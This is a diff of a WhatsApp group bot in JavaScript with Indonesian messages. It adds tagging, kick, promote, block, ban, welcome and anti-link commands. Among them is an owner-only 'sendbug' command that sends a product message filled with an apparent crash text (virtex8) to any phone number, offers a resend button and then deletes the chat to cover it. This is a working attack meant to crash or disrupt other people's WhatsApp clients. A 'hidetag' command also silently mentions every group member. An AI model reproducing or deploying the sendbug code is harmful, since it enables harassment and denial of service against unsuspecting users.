+            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return setReply(mess.only.admin)
+            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
+            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            value = args.join(" ")
+            var group = await xdev.groupMetadata(from)
+            var member = group['participants']
+            var mem = []
+            member.map(async adm => {
+            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
+            })
+            var options = {
+                contextInfo: { mentionedJid: mem },
+                quoted: dev
+            }
+            ini_buffer = fs.readFileSync(file)
+            xdev.sendMessage(from, ini_buffer, sticker, options)
+            fs.unlinkSync(file)
+            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
+            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            value = args.join(" ")
+            var group = await xdev.groupMetadata(from)
+            var member = group['participants']
+            var mem = []
+            member.map(async adm => {
+            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
+            })
+            var options = {
+                contextInfo: { mentionedJid: mem },
+                quoted: dev
+            }
+            ini_buffer = fs.readFileSync(file)
+            xdev.sendMessage(from, ini_buffer, image, options)
+            fs.unlinkSync(file)
+        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
+            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            value = args.join(" ")
+            var group = await xdev.groupMetadata(from)
+            var member = group['participants']
+            var mem = []
+            member.map(async adm => {
+            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
+            })
+            var options = {
+            	mimetype : 'audio/mp4',
+            	ptt : true,
+                contextInfo: { mentionedJid: mem },
+                quoted: dev
+            }
+            ini_buffer = fs.readFileSync(file)
+            xdev.sendMessage(from, ini_buffer, audio, options)
+            fs.unlinkSync(file)
+        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
+            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
+            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
+            value = args.join(" ")
+            var group = await xdev.groupMetadata(from)
+            var member = group['participants']
+            var mem = []
+            member.map(async adm => {
+            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
+            })
+            var options = {
+            	mimetype : 'video/mp4',
+                contextInfo: { mentionedJid: mem },
+                quoted: dev
+            }
+            ini_buffer = fs.readFileSync(file)
+            xdev.sendMessage(from, ini_buffer, video, options)
+            fs.unlinkSync(file)
+        } else{
+          setReply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
+        }
+        break
+	
+	
+	case 'hidetag':
+	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
+  if(isExtream) return
+			if (!dev.key.fromMe & !isGroupAdmins) return setReply(mess.only.admin)
+			if (!isGroup) return setReply(mess.only.group)
+			var value = args.join(' ')
+			var group = await xdev.groupMetadata(from)
+			var member = group['participants']
+			var mem = []
+			member.map(async adm => {
+			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
+			})
+			var optionshidetag = {
+			text: value,
+			contextInfo: { mentionedJid: mem },
+			quoted: dev
+			}
+			xdev.sendMessage(from, optionshidetag, text)
+			break
+	
+	
+  //-------------------------------》FITUR GROUP《-------------------------------\\       
+    
+    
+case 'simi':              
+if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+if (!isGroup) return setReply('hanya bisa di group')
+if (isSimi) return setReply('Fitur sudah aktif kak')
+siminya.push(from);
+let ih =`Fitur simi telah di aktifkan di group ini, ketik silakan ketik ${prefix}halo`
+xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+if (!isGroup) return setReply('hanya bisa di group')
+if (!isSimi) return setReply('Udah mati')
+siminya.splice(from, 1);
+let ih =`Fitur simi telah di matikan`
+xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+}else if (!q) {
+sendButMessage(from, `MODE SIMI SIMI`, `Silahkan pilih salah satu`, [
+{buttonId: `${prefix}simi on`, buttonText: {displayText: On },type: 1},
+{buttonId: `${prefix}simi off`, buttonText: { displayText: Off },type: 1}]);
+} else {  
+if(isSimi) return   
+simi = await fetchJson(`https://api.simsimi.net/v2/?text=${q}&lc=id`)
+sami = simi.success
+setReply(sami) 
+}
+break
+             
+             
+    
+    
+case 'linkgc':
+case 'linkgroup':
+if (!isGroup) return
+if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+linkgc = await xdev.groupInviteCode(from)
+yeh = `*「 Link Group 」*\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n\n_yo bisa yo ramein_`
+xdev.sendMessage(from, yeh, text, { quoted: dev })
+break
+
+case 'gc':
+case 'group':
+if (!isGroupAdmins) return sendSticker(hanyaadmin)
+if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+if (!isGroup) return
+ if (!q) {
+               sendButMessage(from, `GRUP SETTING`, `Silahkan pilih salah satu`, [
+                 {buttonId: `${prefix}group open`, buttonText: {displayText: `OPEN`,},type: 1},
+                 {buttonId: `${prefix}group close`, buttonText: {displayText: `CLOSE`,},type: 1},
+                  {buttonId: `${prefix}revoke`, buttonText: { displayText: `REVOKE`,},type: 1}]);
+                    }
+if (args[0] === 'open') {
+
+await  xdev.groupSettingChange(from, GroupSettingChange.messageSend, false)
+await setReply('_Success_')
+} else if (args[0] === 'close') {
+ await xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
+await setReply('_Success_')
+}
+                 break;
+
+
+case 'setdesc':
+case 'setdesk':
+if (!isGroupAdmins) return sendSticker(hanyaadmin)
+			if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+if (!isGroup) return
+if(!q) return setReply("Teksnya apa")
+xdev.groupUpdateDescription(from, q)
+setReply("Succes")
+break
+
+case 'setnamegc':
+{
+if(!q) return setReply("masukin teksnya kak")
+if (!isGroupAdmins) return sendSticker(hanyaadmin)
+if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+if (!isGroup) return
+await xdev.groupUpdateSubject(from, `${args.join(" ")}`)
+await xdev.sendMessage(from, 'Succes change name group', text, {quoted:dev})
+}
+break
+
+
+
+
+
+	case 'unadmin':
+	case 'demote':
+	if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
+if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+if (!isGroup) return
+if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
+if(!q) return setReply(`Penggunaan :\n${prefix}promote Tag/Reply/input nomer`)       
+if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
+nomor = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
+xdev.groupDemoteAdmin(from, [nomor])
+teks = `Members @${nomor.split('@')[0]} succes demote`
+xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[nomor]}})
+
+} else if (dev.message.extendedTextMessage.contextInfo.participant) {
+premnih = dev.message.extendedTextMessage.contextInfo.participant
+if (!isGroup) return setReply("Hanya bisa di group")
+xdev.groupDemoteAdmin(from, [premnih])
+teks = `Members @${premnih.split('@')[0]} succes demote`
+xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[premnih]}})
+
+ } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
+mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
+if (mentioned.length > 1) return setReply(`Satu satu dong`)
+lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
+xdev.groupDemoteAdmin(from, [lulu])
+teks = `Members @${lulu.split('@')[0]} succes demote`
+xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[lulu]}})
+   } else{
+ setReply(`Kirim perintah ${prefix}promote tag atau input nomor atau reply pesan orang yang ingin di promote`)
+ }
+break    
+
+
+
+
+
+
+
+
+
+
+case 'admin':
+	case 'promote':
+	if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
+if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+if (!isGroup) return
+if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
+if(!q) return setReply(`Penggunaan :\n${prefix}promote Tag/Reply/input nomer`)       
+if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
+nomor = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
+xdev.groupMakeAdmin(from, [nomor])
+teks = `Members @${nomor.split('@')[0]} succes promote`
+xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[nomor]}})
+
+} else if (dev.message.extendedTextMessage.contextInfo.participant) {
+premnih = dev.message.extendedTextMessage.contextInfo.participant
+if (!isGroup) return setReply("Hanya bisa di group")
+xdev.groupMakeAdmin(from, [premnih])
+teks = `Members @${premnih.split('@')[0]} succes promote`
+xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[premnih]}})
+
+ } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
+mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
+if (mentioned.length > 1) return setReply(`Satu satu dong`)
+lulu =`${mentioned[0].split('@')[0]}@s.whatsapp.net`
+xdev.groupMakeAdmin(from, [lulu])
+teks = `Members @${lulu.split('@')[0]} succes promote`
+xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[lulu]}})
+   } else{
+ setReply(`Kirim perintah ${prefix}promote tag atau input nomor atau reply pesan orang yang ingin di promote`)
+ }
+break    
+	
+
+
+
+
+
+
+case 'revoke':
+if (!isGroupAdmins) return sendSticker(hanyaadmin)
+if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+if (!isGroup) return
+await xdev.revokeInvite(from)
+await setReply('_Success_')
+break
+
+    
+    
+    case "antihidetag":
+        if (!isGroup) return setReply("Khusus di grup");
+        if (!isGroupAdmins) return sendSticker(hanyaadmin)
+		if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+		if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
+        if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+          if (isAntihidetag) return setReply("Sudah aktif!!");
+          addDataId(from, command, DataId)
+          setReply("Sukses mengaktifkan antihidetag!");
+        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+          removeDataId (command, from, DataId)
+          setReply("Sukses mematikan antihidetag!");
+        } else if (!q) {
+          sendButMessage(
+            from,
+            `MODE ANTIHIDETAG`,
+            `Silahkan pilih salah satu`,
+            [
+              {
+                buttonId: `${prefix}antihidetag on`,
+                buttonText: {
+                  displayText: `on`,
+                },
+                type: 1,
+              },
+              {
+                buttonId: `${prefix}antihidetag off`,
+                buttonText: {
+                  displayText: `off`,
+                },
+                type: 1,
+              },
+            ]
+          );
+        }
+        break;
+					
+					
+					
+					
+					
+					case 'antivo':
+					if (!isGroupAdmins) return sendSticker(hanyaadmin)
+					     if(isExtream) return
+					if (!isGroup) return setReply('hanya bisa di group')
+					if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
+          if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+          
+          if (isAntiviewonce) return setReply("Sudah aktif!!");
+          addDataId(from, command, DataId)
+          setReply("Sukses mengaktifkan antiviewonce!");
+        } else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+           
+          if (!isAntiviewonce) return setReply("Sudah mati!!");       
+          removeDataId (command, from, DataId)
+          setReply("Sukses mematikan antiviewonce!");
+        } else if (!q) {
+          sendButMessage(
+            from,
+            `MODE ANTI VIEW ONCE`,
+            `Silahkan pilih salah satu`,
+            [
+              {
+                buttonId: `${prefix}antivo on`,
+                buttonText: {
+                  displayText: `on`,
+                },
+                type: 1,
+              },
+              {
+                buttonId: `${prefix}antivo off`,
+                buttonText: {
+                  displayText: `off`,
+                },
+                type: 1,
+              },
+            ]
+          );
+        }
+        break;
+					
+					
+					
+					
+    
+
+case 'kicktime':
+if (!isGroupAdmins) return sendSticker(hanyaadmin)
+if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+if (!isGroup) return
+if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return setReply('Reply targetnya kak')
+mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
+if (mentioned.length > 1) return setReply(`*Ya jangan lebih dari satu dong kak ${pushname} nanti aku kena banned* 😒`)
+if (mentioned.length < 1) {
+asu = dev.message.extendedTextMessage.contextInfo.participant
+if(dev.message.extendedTextMessage === ownerNumber[0]) return setReply('Tidak bisa kick owner')
+aw =fs.readFileSync('./sticker/bismilah.webp')
+                   setTimeout( () => {
+                   sendSticker1(aw)
+                     }, 10000)
+                   setTimeout( () => {
+					xdev.sendMessage(from, 'Yok sama" Al-fatihah 😁', text)
+					}, 8000)
+					setTimeout( () => {
+					setReply('Sukses kak 😆')
+					}, 7000)
+					setTimeout( () => {
+					xdev.groupRemove(from, [asu])
+					}, 6000)
+					setTimeout( () => {
+					xdev.sendMessage(from, `Bismilah Kick`, text) // ur cods
+					}, 5000)
+					setTimeout( () => {
+					xdev.sendMessage(from, 'Asekk dapet dapet jatah kick 😋', text)
+					}, 2500)
+					setTimeout( () => {
+					setReply('Perintah diterima kak 😃')
+					}, 0)
+					} else {
+                   if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
+                    if (mentioned.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa kick owner group`)
+                    uw =fs.readFileSync('./sticker/bismilah.webp')
+                   setTimeout( () => {
+                   sendSticker1(uw)
+                     }, 10000)
+                   setTimeout( () => {
+					xdev.sendMessage(from, 'Yok sama" Al-fatihah ??', text)
+					}, 8000)
+					setTimeout( () => {
+					setReply('Sukses kak 😆')
+					}, 7000)
+					setTimeout( () => {
+					 xdev.groupRemove(from, [mentioned[0]])
+					}, 6000)
+					setTimeout( () => {
+					xdev.sendMessage(from, `Bismilah Kick`, text) // ur cods
+					}, 5000)
+					setTimeout( () => {
+					xdev.sendMessage(from, 'Asekk dapet dapet jatah kick ??', text)
+					}, 2500)
+					setTimeout( () => {
+					setReply('Perintah diterima kak 😃')
+					}, 0)
+                    }
+                     break    
+					
+					
+					
+					
+					
+case 'kickme':
+try{
+if (!isGroupAdmins) return sendSticker(hanyaadmin)
+if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+if (!isGroup) return
+await xdev.groupRemove(from, [sender])
+await setReply("Done wkwkw")
+} catch (err){
+setReply(`${err}`)
+}
+break
+					
+
+
+    
+case 'kick':
+if (!isGroupAdmins) return sendSticker(hanyaadmin)
+if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+if (!isGroup) return
+if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
+if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer`)       
+if (args[0] == '08') return setReply('Awali nomor dengan 62')  
+if (args[0] == botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
+woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
+if(woke === ownerNumber[0]) return setReply("Ga mau")
+await setReply(`Asek asek jatah kick euy 😋`);
+await xdev.groupRemove(from, [woke])
+    
+} else if (mentionByReply) {
+if (!isGroup) return setReply("Hanya bisa di group")
+Nomer =`${mentionByReply.split("@")[0]}@s.whatsapp.net`
+if(Nomer === ownerNumber[0]) return setReply("Ga mau")
+if(Nomer === botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
+await setReply( `Modar kena kick awokawok 🤣`);
+await xdev.groupRemove(from, [mentionByReply])
+    
+ } else if(mentionByTag.length == 1) { 
+if (mentionByTag.length > 1) return setReply(`Satu satu dong`)
+if (mentionByTag.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
+if(mentionByTag[0].split("@")[0] + '@s.whatsapp.net' === botNumber) return setReply('Kunaon siah main kick2 aing, aing teh macan')  
+if (mentionByTag.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa kick owner group`)
+await setReply(`Asek dapet jatah kick, Otw kick 😋`);
+await xdev.groupRemove(from, [mentionByTag[0]])
+} else{
+setReply(`Kirim perintah ${prefix}kick @tag atau nomor atau reply pesan orang yang ingin di kick`)
+}
+break    
+
+
+case 'add':
+try{
+					if (!isGroup) return setReply(mess.only.group)
+					if (!isGroupAdmins) return sendSticker(hanyaadmin)
+			        if (!isBotGroupAdmins) return sendSticker(jadiinadmin)     
+					if ( dev.message.extendedTextMessage === null) {
+					if(!q) return setReply("Reply atau input nomer target")
+                  	if (args[0] == '08') return setReply('Awali nomor dengan 62')
+					  woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
+											response = await xdev.groupAdd(from, [woke])
+											o = response.participants[0]
+											let inv = (Object.values(o))
+											if(inv[0].code == 409) return setReply('Target Sudah Di Didalam Group!')
+											if(inv[0].code == 403) return setReply('Eror, user private acc')
+											if(inv[0].code == 408) return setReply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
+											if(inv[0].code == 401) return setReply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
+						await xdev.sendMessage(from,`Berhasil menambahkan ${q} ke dalam group ${groupName}`,text);          
+						} else if (mentionByReply) {
+if (!isGroup) return setReply("Hanya bisa di group")
+													response = await xdev.groupAdd(from, [mentionByReply])
+													o = response.participants[0]
+													let inv = (Object.values(o))
+													if(inv[0].code == 409) return setReply('Target Sudah Di Didalam Group!')
+													if(inv[0].code == 403) return setReply('Gagal, Karena Di Private')
+													if(inv[0].code == 408) return setReply(`Gagal menambah kan doi dengan alasan: *Dia baru keluar group baru-baru ini*`)
+													if(inv[0].code == 401) return setReply(`Gagal menambah kan doi dengan alasan: *Bot di block oleh yang bersangkutan*`)
+await xdev.sendMessage(from,`Berhasil menambahkan @${mentionByReply.split("@")[0]} ke dalam group ${groupName}`,text, {quoted: setQuoted});          
+} else{
+setReply("Reply atau input nomer target")
+}
+} catch (err){
+console.log(err)
+setReply("Terjadi Error, Tolong input nomer dengan benar")
+}
+break
+
+
+
+
+case 'sendbug':
+if (!isOwner) return onlyOwner()
+{
+reply("*Sending...*")
+if (args[0] == '08') return setReply('Awali nomor dengan 62')
+woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
+hmm4 = fs.readFileSync('./stik/fake.jpeg'),
+imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
+imeg = imeu.message.imageMessage
+res = await xdev.prepareMessageFromContent(woke, {
+'productMessage': {
+'product': {
+'productImage': imeg,
+'productId': '',
+'title': virtex8(prefix),
+'description': virtex8(prefix),
+'priceAmount1000': '1000',
+'descriptionCount': 1,
+'productImageCount': '1'
+},
+'businessOwnerJid': `0@s.whatsapp.net`,
+'contextInfo': forward
+}
+}, {
+contextInfo: forward
+}), 
+await xdev.relayWAMessage(res)
+teks =`Sukses sendbug ke nomer ${woke.split("@")[0]}`
+
+let aklo = [
+{"buttonId": `${prefix}sendbug ${q} `,"buttonText": {"displayText": `sᴇɴᴅ ʟᴀɢɪ`},"type": "RESPONSE"},
+{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"}
+]
+await sendButMessage(from, teks, copyright, aklo)
+await xdev.modifyChat(woke, ChatModification.delete)
+console.log("Sukses sendbug")
+}
+break;
+
+
+
+
+
+case 'block':
+	if (!isGroupAdmins) return sendSticker(hanyaadmin)
+if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+if (!isGroup) return
+if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
+if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}kick +62xxx 1h`)       
+if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
+woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
+if(woke === ownerNumber[0]) return setReply("Ga mau")
+await xdev.blockUser(woke, "add")
+await addBlock(woke, blocked)
+await setReply( `Sukses block ${woke.split("@")[0]}`);
+    
+} else if (dev.message.extendedTextMessage.contextInfo.participant) {
+if (!isGroup) return setReply("Hanya bisa di group")
+asu = dev.message.extendedTextMessage.contextInfo.participant
+Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
+if(Nomer === ownerNumber[0]) return setReply("Ga mau")
+await xdev.blockUser(Nomer, "add")
+await addBlock(Nomer, blocked)
+await setReply( `Berhasil block ${Nomer.split("@")[0]}`);
+    
+ } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
+mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
+if (mentioned.length > 1) return setReply(`Satu satu dong`)
+if (mentioned.includes(ownerNumber[0])) return setReply(`Tidak bisa kick Owner`)
+ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
+await xdev.blockUser(ahah, "add")
+await addBlock(ahah, blocked)
+await setReply(`${ahah.split("@")[0]} berhasil di block`);
+   } else{
+ setReply(`Kirim perintah ${prefix}block @tag atau nomor atau reply pesan orang yang ingin di block`)
+ }
+break    
+
+
+case 'unblock':
+	if (!isGroupAdmins) return sendSticker(hanyaadmin)
+if (!isBotGroupAdmins) return sendSticker(jadiinadmin)
+if (!isGroup) return
+if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) {
+if(!q) return setReply(`Penggunaan :\n${prefix}kick Tag/Reply/input nomer\n\nPilih waktu\ns = detik\nh = jam\nd =hari\n\nContoh: ${prefix}kick +62xxx 1h`)       
+if (args[0].includes('08')) return setReply('Awali nomor dengan 62')  
+woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
+await xdev.blockUser(woke, "remove")
+await unBlock(woke, blocked)
+await setReply( `Sukses unblock ${woke.split("@")[0]}`);
+    
+} else if (dev.message.extendedTextMessage.contextInfo.participant) {
+if (!isGroup) return setReply("Hanya bisa di group")
+asu = dev.message.extendedTextMessage.contextInfo.participant
+Nomer =`${asu.split("@")[0]}@s.whatsapp.net`
+await xdev.blockUser(Nomer, "remove")
+await unBlock(Nomer, blocked)
+await setReply( `Berhasil unblock ${Nomer.split("@")[0]}`);
+    
+ } else if(dev.message.extendedTextMessage.contextInfo.mentionedJid.length == 1) { 
+mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid;
+if (mentioned.length > 1) return setReply(`Satu satu dong`)
+ahah = `${mentioned[0].split('@')[0]}@s.whatsapp.net`
+await xdev.blockUser(ahah, "remove")
+await unBlock(ahah, blocked)
+await setReply(`${ahah.split("@")[0]} berhasil di unblock`);
+   } else{
+ setReply(`Kirim perintah ${prefix}unblock @tag atau nomor atau reply pesan orang yang ingin di block`)
+ }
+break    
+
+
+case 'unbanned':
+			case 'unban': //PERCOBAA
+		    if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
+			if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) {
+			
+if (q.startsWith('08')){
+return setReply('Awali nomor dengan 62') 
+} else  if (q.startsWith('62')){
+var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
+} else {
+ return setReply("Masukan nomer")
+}
+
+		    if(!cekBannedUser (woke, ban)) return setReply("Udah di unban")
+            unBanned (woke, ban)             
+            setReply( `*Sukses Unban ${woke}`);
+            } else if (isGroup && mentionByReply) {
+            asu = dev.message.extendedTextMessage.contextInfo.participant           
+            if(!cekBannedUser (asu, ban)) return setReply("Udah di unban")
+            unBanned (asu, ban)             
+            setReply( `*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${asu.split("@")[0]}`);
+            } else if(isGroup && mentionByTag){
+       	 if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
+            if (mentionByTag.includes(ownerNumber[0])) return setReply(`Tidak bisa banned Owner`)
+            if (mentionByTag.includes(from.split("-")[0] + '@s.whatsapp.net')) return setReply(`Tidak bisa banned owner group`)    
+            lala = `${mentionByTag[0].split('@')[0]}@s.whatsapp.net`
+            if(!cekBannedUser (lala, ban)) return setReply("Udah di unban")        
+            unBanned(lala, ban) 
+            setReply(`*Klo udah di unban jangan jadi beban lagi yah*  🙂 @${mentioned[0].split('@')[0]}`);
+            } else {
+            setReply("Noob")
+            }
+            break    
+         
+
+    
+    case 'setwelcome':
+    if ((args[0]) === 'type1' ) {
+    if(xdev.welcome === "type1") return setReply("Udah aktif")
+    xdev.welcome = "type1"
+    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
+    } else if ((args[0]) === 'type2' ) {
+    if(xdev.welcome === "type2") return setReply("Udah aktif")
+    xdev.welcome = "type2"
+    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
+    } else if ((args[0]) === 'type3' ) {
+   if(xdev.welcome === "type3") return setReply("Udah aktif")
+    xdev.welcome = "type3"
+    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
+    } else if ((args[0]) === 'type4' ) {
+   if(xdev.welcome === "type4") return setReply("Udah aktif")
+    xdev.welcome = "type4"
+    setReply(`Berhasil mengubah welcome ke ${xdev.welcome}`)
+    } else if(!q){
+    setReply("Pilih setwelcome : type1 atau type2 atau type3")
+    } else {
+    setReply("Query tidak di temukan")
+    }
+    break
+    
+    
+   
+    
+    
+    case 'welcome':
+    if (!isGroupAdmins) return sendSticker(hanyaadmin)
+                    if(isExtream) return
+					if (!isGroup) return setReply('hanya bisa di group')
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+						if (isWelkom) return setReply('Fitur welcome sudah aktif kak')
+						welkom.push(from)
+						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
+						let ih =`Fitur welcome telah aktif`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+						if (!isWelkom) return setReply('Udah mati')
+						welkom.splice(from, 1)
+						fs.writeFileSync('./database/welkom.json', JSON.stringify(welkom))
+						let ih =`Fitur welcome telah di matikan`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					}else if (!q) {
+                      sendButMessage(from, `MODE WELCOME`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}welcome on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}welcome off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;                 
+
+
+                 
+                 case 'antidel':
+                 case 'antidelete':
+    if (!isGroupAdmins && !isOwner) return sendSticker(hanyaadmin)
+                    if(isExtream) return
+					if (!isGroup) return setReply('hanya bisa di group')
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+						if (isAntidel) return setReply('Sudah aktif kak')
+						xdev.antidel.push(from)
+						let ih =`Fitur anti delete telah aktif`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+						if (!isAntidel) return setReply('Udah mati')
+						xdev.antidel.splice(from, 1)
+						let ih =`Fitur anti delete telah di matikan`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					}else if (!q) {
+                      sendButMessage(from, `MODE ANTI DELETE`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}antidel on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}antidel off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+                 
+                 
+                 
+      case 'antilinkgc':
+      if (!isGroupAdmins) return sendSticker(hanyaadmin)
+					if (!isGroup) return setReply('hanya bisa di group')
+					if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
+					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
+						if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
+						addDataId(from, command, DataId)
+						let ih =`Fitur antilink group telah di aktifkan`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
+						if (!isAntilinkGc) return setReply('Udah mati')
+						removeDataId (command, from, DataId)
+						let ih =`Fitur antilink group telah di matikan`
+                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
+					}else if (!q) {
+                      sendButMessage(from, `MODE ANTI LINK GROUP`, `Silahkan pilih salah satu`, [
+                      {buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: On },type: 1},
+                      {buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: Off },type: 1}]);
+                    }
+                 break;
+                 
+                 
+                 
+    
+    
+    
+    
+ 
+    
+
+       
+       
+         
+
+
+
+
+					
+					
+					case "antivirtex":
+	    if(isExtream) return
